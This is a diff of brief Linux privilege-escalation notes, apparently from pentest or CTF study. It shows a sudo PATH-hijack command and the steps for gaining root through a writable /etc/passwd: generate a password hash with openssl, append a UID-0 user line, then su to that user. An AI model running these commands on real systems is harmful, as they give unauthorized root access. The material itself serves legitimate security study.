@@ -23,9 +23,11 @@ If we see a SETENV in that case we need to -
         
          sudo PATH=/tmp:$PATH /opt/cleanup.sh
 
+-----------------------------------------------------       
+
 if you have read/write access to /etc/passwd you can:
-   a. openssl passwd <whateverPasswordYouWant>
-   b. echo "myUser:<openSSLHash>:0:0:root:/root:/bin/bash" >> /etc/passwd
-   c. su myUser
+    openssl passwd whateverPasswordYouWant
+    echo "myUser:hashFromAboveCommand:0:0:root:/root:/bin/bash" >> /etc/passwd
+    su myUser
          
    
